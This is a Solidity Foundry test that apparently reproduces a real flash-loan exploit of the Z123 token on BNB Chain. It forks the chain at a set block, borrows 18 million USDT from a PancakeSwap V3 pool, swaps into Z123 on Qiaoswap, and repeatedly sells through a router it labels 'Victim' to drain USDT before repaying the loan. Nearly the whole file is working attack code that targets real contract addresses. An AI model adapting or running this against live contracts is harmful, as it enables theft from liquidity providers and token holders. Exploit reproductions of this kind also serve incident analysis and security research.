// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IPancakeV3.sol";
import "@interface/IPancakeV2.sol";
import "@interface/IERC20.sol";

import "./IQiaoswap.sol";
import "./IZ123.sol";

IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
IZ123 constant Z123 = IZ123(0xb000f121A173D7Dd638bb080fEe669a2F3Af9760);

// USDT/WBNB
IPancakePairV3 constant USD_BNB_Pool = IPancakePairV3(
    0x36696169C63e42cd08ce11f5deeBbCeBae652050
);
IQiaoswapV2Router02 constant QiaoswapV2Router02 = IQiaoswapV2Router02(
    payable(0x901c0967DF19fA0Af98Fd958E70F30301d7580dD)
);
// USDT/Z123
IQiaoswapV2Pair constant QiaoZ123Pair = IQiaoswapV2Pair(
    0x93515A5Dbc2834D687721111d966DE472d682a47
);

IPancakeRouterV2 constant Victim = IPancakeRouterV2(
    payable(0x6125c643a2D4A927ACd63C1185c6be902eFd5dC8)
);

contract Z123Hack {
    address admin;

    constructor() payable {
        admin = msg.sender;
    }

    function fuckyou() public {
        USD_BNB_Pool.flash(address(this), 18000000 ether, 0, "");
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        fee1;
        data;

        require(msg.sender == address(USD_BNB_Pool), "not authorized");

        BUSDT.approve(address(QiaoswapV2Router02), 1000000000000 ether);

        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(Z123);
        // get Z123 -> 575112.575667322839911395
        QiaoswapV2Router02
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                18000000 ether,
                1,
                path,
                address(this),
                block.timestamp + 1
            );

        Z123.approve(address(Victim), 1000000000000000 ether);

        path[0] = address(Z123);
        path[1] = address(BUSDT);

        for (int i = 0; i < 80; i++) {
            Victim.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                7125 ether,
                1,
                path,
                address(this),
                block.timestamp
            );
        }

        // repay the money
        BUSDT.transfer(address(USD_BNB_Pool), 18000000 ether + fee0);
    }
}

contract Z123Test is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 38077211 - 1);
    }

    function testExploit() public {
        Z123Hack hacker = new Z123Hack();
        hacker.fuckyou();

        emit log_named_decimal_uint(
            "BUSDT balance",
            BUSDT.balanceOf(address(hacker)),
            BUSDT.decimals()
        );
    }
}
